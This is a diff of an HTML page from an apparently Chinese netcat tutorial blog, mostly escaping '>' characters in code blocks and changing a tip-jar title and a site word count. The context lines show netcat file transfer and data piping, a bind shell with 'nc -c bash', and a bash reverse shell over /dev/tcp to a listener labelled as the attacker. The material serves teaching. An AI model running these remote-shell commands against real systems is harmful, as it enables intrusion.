@@ -533,17 +533,17 @@ nc -nv 1.1.1.1 4444
 <p>我的电脑: <code>nc -l -p 3333 &gt; ps.txt</code>   输出结果重定向到文件<br>被审计系统:<code>ps -ef | nc -nv 1.1.1.1 3333 -q 1</code>    参数-q: 输出完成之后过1秒就断开</p>
 <p>题外话：<code>lsof</code> 查看已经打开的文件</p>
 <h4 id="3-传输文件-目录"><a href="#3-传输文件-目录" class="headerlink" title="3.传输文件/目录"></a><font color="red">3.传输文件/目录</font></h4><h6 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h6><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 客户端向服务端传输  （正向） </span>
-A： nc-lp 3333 <span class="token operator">></span> 1.mp4
+A： nc-lp 3333 <span class="token operator">&gt;</span> 1.mp4
 B:  nc -nv 1.1.1.1 3333 <span class="token operator">&lt;</span> 1.mp4 -q 1
 <span class="token comment" spellcheck="true"># 或者, 服务端向客户端传输文件  （反向）</span>
 A:  nc -q 1 -lp 3333 <span class="token operator">&lt;</span> a.mp4
-B:  nc -nv 1.1.1.1 3333 <span class="token operator">></span> 2.mp4
+B:  nc -nv 1.1.1.1 3333 <span class="token operator">&gt;</span> 2.mp4
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h6 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h6><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 正向(服务端先打包再传给客户端,注意小横线别遗漏)</span>
 A:  <span class="token function">tar</span> -cvf - music/ <span class="token operator">|</span> nc -lp 3333 -q 1
 B:  nc -nv 1.1.1.1 3333 <span class="token operator">|</span> <span class="token function">tar</span> -xvf -     <span class="token comment" spellcheck="true"># 先接收再解包</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h6 id="加密传文件"><a href="#加密传文件" class="headerlink" title="加密传文件"></a>加密传文件</h6><pre class="line-numbers language-bash"><code class="language-bash">A： nc -lp 3333 <span class="token operator">|</span> mcrypt --flush -Fbqd -a rijndael-256-m ecb <span class="token operator">></span> 1.mp4     <span class="token comment" spellcheck="true"># 接收，解密</span>
+<h6 id="加密传文件"><a href="#加密传文件" class="headerlink" title="加密传文件"></a>加密传文件</h6><pre class="line-numbers language-bash"><code class="language-bash">A： nc -lp 3333 <span class="token operator">|</span> mcrypt --flush -Fbqd -a rijndael-256-m ecb <span class="token operator">&gt;</span> 1.mp4     <span class="token comment" spellcheck="true"># 接收，解密</span>
 B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb <span class="token operator">&lt;</span> a.mp4 <span class="token operator">|</span> nc 1.1.1.1 3333 -q 1   <span class="token comment" spellcheck="true"># 加密，传送</span>
 <span class="token comment" spellcheck="true"># 需要输入加密秘钥，解密秘钥</span>
 <span class="token comment" spellcheck="true"># 不是nc的加密功能，是操作系统的加密命令，可以自行安装</span>
@@ -574,7 +574,7 @@ B:  nc 1.1.1.1 3333
 B:  nc 1.1.1.1 3333 -c <span class="token function">bash</span>    <span class="token comment" spellcheck="true">#目标机器</span>
 
 <span class="token comment" spellcheck="true">#假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell</span>
-目标机器： <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/2223 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+目标机器： <span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/2223 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
 攻击方： nc -lvvp 2223
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
@@ -808,7 +808,7 @@ B:  ncat -nv 192.168.1.19 3333 --ssl      <span class="token comment" spellcheck
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">如果感觉对您有帮助，请我吃包辣条吧</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -1179,7 +1179,7 @@ ping 127.0.0.1 如果能通，说明本机的TCP/IP协议已经配置成功啦ar
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">355k</span>&nbsp;字
+                class="white-color">358.6k</span>&nbsp;字
             
             
             
